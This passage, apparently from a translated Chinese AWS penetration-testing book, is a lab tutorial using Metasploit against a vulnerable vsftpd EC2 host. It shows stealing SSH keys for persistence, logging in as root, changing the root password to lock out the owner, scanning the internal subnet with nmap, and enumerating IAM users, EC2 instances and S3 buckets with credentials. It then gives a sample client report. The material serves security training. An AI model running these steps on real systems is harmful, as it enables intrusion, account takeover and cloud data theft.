接下来，我们将在当前的**Meterpreter**会话中使用一个模块。我们将要使用的模块将为我们窃取 SSH 密钥，并基本上允许我们持久地访问系统。

让我们继续退出当前会话，输入`background`。接下来，加载并运行以下模块：

```
$ use post/linux/manage/sshkey_persistence
$ set session 2
$ run
```

这将给出以下输出：

![图 9.38 – 获取 SSH 公钥](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_9.38_B15630.jpg)

图 9.38 – 获取 SSH 公钥

现在我们可以利用这一点来实现持久性！将窃取的**SSH 密钥**复制到您的本地 Kali 机器上。然后，保存文件并更改权限：

```
$ chmod 400 vsftpd.pem
```

很好，现在权限都设置好了，我们可以继续进入我们的被黑客攻击的目标：

```
$ ssh -i vsftpd.pem root@ec2-54-245-170-97.us-west-2.compute.amazonaws.com
```

这将给出以下输出：

![图 9.39 – 以 root 身份 SSH 进入目标主机](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_9.39_B15630.jpg)

图 9.39 – 以 root 身份 SSH 进入目标主机

现在有一件事情，如果不被发现，会相当危险 – 让我们将密码更改为我们可以记住的内容，并且会拒绝客户端访问系统！

```
$ passwd root
```

您将看到以下输出：

![图 9.40 – 更改 root 账户的密码](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_9.40_B15630.jpg)

图 9.40 – 更改 root 账户的密码

现在，我们有一个密码可以使用，目标用户不知道。现在我们已经将密码更改为 root 账户，他们将无法以 root 级别访问它 – 这意味着我们完全控制了主机。

在结束这次渗透测试之前，我们将看一下具有公共访问权限的 EC2 实例也是内部网络的一部分的危险。在这种情况下，我们的利用主机到内部/私有网络的 IP 是`172.31.7.0/24`。我们可以使用`ifconfig`命令收集这些信息。请参考*图 9.37*进行说明。

要成功发现系统上的任何主机，我们需要在被利用的`vsftpd`服务器上安装 Nmap。安装和部署**Nmap**将允许我们扫描内部网络，查找任何在线主机 – 或者在我们的情况下，可以用来进一步利用的“目标”。

接下来，我们将在利用机器上运行以下命令来安装 Nmap：

```
$ apt install nmap
```

现在我们可以扫描网络内部，看看是否有其他主机在线！

```
$ nmap 172.31.7.0/24 -sn
```

这将给我们以下输出：

![图 9.41 – 扫描新发现的内部主机](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_9.41_B15630.jpg)

图 9.41 – 扫描新发现的内部主机

看起来我们找到了另一个可能成为另一个被攻击目标的主机。让我们对主机进行版本扫描，看看我们可以在主机上发现什么：

```
$ nmap <<ec2 instance>>  -sV
```

您将看到以下输出：

![图 9.42 – 扫描新发现的内部主机的端口和服务](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_9.42_B15630.jpg)

图 9.42 – 扫描新发现的内部主机的端口和服务

从这里，我们可以转向我们发现的主机，但是现在我们不需要担心这个问题。现在，我们已经有足够的信息让客户了解他们的安全状况的整体风险。让我们继续讨论在这次测试中发现的问题需要报告需要做些什么。

## 报告漏洞

这个测试让我们测试了一个应用程序，该应用程序存在一些严重的漏洞，还让我们看到了内部网络中的其他主机。能够转向网络内的其他主机是非常危险的，因为它让我们看到了通常看不到的系统。此外，根据环境的不同，我们可能会发现一些非常敏感的数据，比如社会安全号码、信用卡号码和医疗保健信息。

重要提示

如果在渗透测试期间发现了敏感信息，渗透测试必须停止所有操作，直到围绕敏感信息的问题得到纠正。

现在让我们讨论如何向我们的目标客户提出关于我们刚刚发现的环境的声明以及我们需要与客户合作以帮助他们纠正问题的内容：

"在渗透测试期间，我们发现了一个易受攻击的文件传输应用程序，该应用程序托管在对公众开放的服务器上。发现了易受攻击的应用程序 VSFTPD 2.3.4，没有任何补丁或更新。一旦我们的渗透测试人员发现了该应用程序，他们就能够利用 Metasploit 这个渗透测试软件攻击位于公共 EC2 实例上的应用程序。该软件允许我们的渗透测试人员利用该应用程序并访问私人内部网络并发现其他主机。

建议尽快更新该应用程序，因为该应用程序很容易受到攻击，并且任何人都可以看到。此外，请确保网络正确分割，并且只有授权的主机可以相互通信。"

这份声明再次避免使用可能会让客户困惑的专业术语。它提到渗透测试人员能够轻松地利用该应用程序并查看内部网络。它还提到了这个问题有多严重，因为我们可以通过**公共 DNS**名称来利用它。

我们已经成功运行了两次不同的渗透测试，攻击了 AWS 内的应用程序，并展示了懒惰管理和缺乏修补所带来的一些真正问题。我们还快速查看了如果我们没有正确保护私人网络中的其他实例可能会发生什么，并讨论了如果攻击者获得访问权限可能会发生什么。

现在，让我们转向一些不同的事情——我们将利用功能测试来发现我们 AWS 环境中的资源。

# 探索 AWS Metasploit 模块

到目前为止，我们一直在使用 Metasploit 来攻击渗透测试范围内的主机。现在，让我们开始查看一些 AWS 模块，以枚举并可能攻击 AWS。对于我们的目的，假设我们能够从客户那里获得凭据。这将是功能测试的一部分。我们想看看我们可以利用这些凭据来做些什么。

首先，让我们启动我们之前攻击过的易受攻击的`vsftpd`实例和**Pentest Playground** VPC 中的 Kali 实例。

现在，我们要做一些不同的事情。这是功能测试和黑盒测试的结合。我们已经窃取了凭据，但对环境一无所知——因此，我们需要看看我们能否找到任何有用的东西！

## 窃取用户凭据

我们要进行的第一个练习将涉及窃取属于其他 AWS 用户帐户的凭据。这些凭据允许您访问 AWS 环境并访问**S3 存储桶**和**Lambda**等资源。

这个练习将涉及更多的功能测试环境，并旨在查看我们可以查看多少个账户。我们不会担心使用找到的账户，因为它们是我们已经参与的同一环境的一部分。

让我们在我们的 AWS Kali Linux 实例中启动**Metasploit**。一旦您启动并运行了 Metasploit，使用以下模块：

```
$ use auxiliary/cloud/aws/enum_iam
```

现在我们加载了模块，是时候用我们的 AWS 账户访问密钥来配置它了。请回顾一下*第四章*，*利用 S3 存储桶*，以了解如何获取您 AWS 环境的凭据。一旦您获得了 AWS 凭据，将**访问密钥 ID**和**秘密访问密钥**设置到**Metasploit**模块中以适应您的账户。

配置好后，使用`run`命令执行模块：

![图 9.43 – 盗取账户](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_9.43_B15630.jpg)

图 9.43 – 盗取账户

现在我们有了更多的用户！您可以使用这些凭据访问其他账户，并可能扩展环境以进一步进行攻击。虽然我们不会太担心这一点，但知道作为这个受损用户，我们现在可以在不访问 AWS 控制台的情况下看到其他账户是很好的。现在，让我们使用 EC2 Metasploit 模块来帮助我们发现正在运行的其他潜在 EC2 实例。

## 在我们未知的环境中发现 EC2 实例

想象一下，一些恶意行为者已经进入了您的环境，但不知道从哪里开始攻击。现在想象一下，恶意黑客能够扫描和发现您环境中的各种实例。下一个练习将帮助我们理解 - 攻击者如何在几分钟内找到您环境中的 EC2 实例！

在这个练习中，我们将使用一个 Metasploit 模块来枚举环境中的所有 EC2 实例。我们需要确保我们的`VSFTPD 2-3-4-Final`实例被用来在练习中展示概念的证明：

1.  首先，在您的 AWS Kali 实例中使用 Metasploit，并使用以下模块：

```
$ use auxiliary/cloud/aws/enum_ec2
```

1.  加载模块后，您需要使用**访问密钥**配置到我们的 AWS 环境中：![图 9.44 – 配置带有凭据的模块](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_9.44_B15630.jpg)

图 9.44 – 配置带有凭据的模块

1.  配置好后，使用`run`命令执行利用：

![图 9.45 – 发现新主机和私有网络](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_9.45_B15630.jpg)

图 9.45 – 发现新主机和私有网络

您将得到很多信息 - 查看正在运行的实例！正如我们在本章的*针对易受攻击的服务应用*部分所看到的，找到一个弱主机，比如`VSFTPD 2-3-4-Final`，可能会导致一些极具影响力的情况，可能导致整个系统被攻破。攻击者可以利用这些信息来利用弱服务并 compromise 内部 AWS 网络。

现在我们已经玩了一些不熟悉的 Metasploit 模块，让我们再看看一个模块，它将枚举我们更熟悉的服务。还记得*第四章*中，*利用 S3 存储桶*，我们是如何枚举 S3 存储桶的吗？现在我们要做的事情完全一样，只是我们将使用 Metasploit。

## 使用 Metasploit 枚举 S3 存储桶

现在，我们将最后一次使用 Metasploit 查看我们的 AWS 环境。我们将使用账户密钥快速枚举一些在 AWS 环境中的存储桶。这不会访问存储桶中的任何内容，但它会让我们知道我们能看到哪些存储桶。

要开始，请使用 Metasploit 中的以下模块：

```
$ use auxiliary/cloud/aws/enum_s3
```

加载完成后，继续配置模块与我们的 AWS 凭据，并使用`run`命令执行模块：

![图 9.46 - 使用 Metasploit 收集 S3 存储桶](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_9.46_B15630.jpg)

图 9.46 - 使用 Metasploit 收集 S3 存储桶

我们成功枚举了我们的`packtawspentesting`存储桶！现在我们可以继续利用存储桶并从 S3 资源中外泄数据。如果您想要回顾如何利用 S3 存储桶，请参考*第四章*，*利用 S3 存储桶*。

我们现在即将结束本章。通过完成所有练习并真正感受到渗透测试 AWS 的感觉，你做得很棒！在本章中我们做了很多，在整本书中也是如此。现在我们将继续进入书的下一部分，在那里我们将讨论所学到的经验教训以及我们如何进行更好的渗透测试。然而，在我们这样做之前，让我们总结一下我们所学到的一切！

# 总结

在本章中，我们深入研究了如何使用 Metasploit 执行一些逼真的渗透测试场景，这有助于我们更好地理解 AWS 中真实的渗透测试是如何进行的。我们还研究了一些在 AWS 中使用的模块，这些模块允许我们在我们的范围环境内执行功能测试并收集信息，从而使我们进一步加强攻击。

接下来，我们将开始研究在完成渗透测试后会发生什么。重要的是要理解概念和流程，以及在完成渗透测试后该做什么，以及我们如何利用渗透测试后的时间来帮助客户加强安全。我们还将开始进一步讨论如何为渗透测试做准备，以及在 AWS 中完成成功的渗透测试所需的步骤。

# 进一步阅读

+   有关使用 Metasploit 的更多信息：[`www.exploit-db.com/docs/english/44040-the-easiest-metasploit-guide-you%E2%80%99ll-ever-read.pdf`](https://www.exploit-db.com/docs/english/44040-the-easiest-metasploit-guide-you%E2%80%99ll-ever-read.pdf)

+   Amazon Lightsail：[`aws.amazon.com/lightsail/`](https://aws.amazon.com/lightsail/)
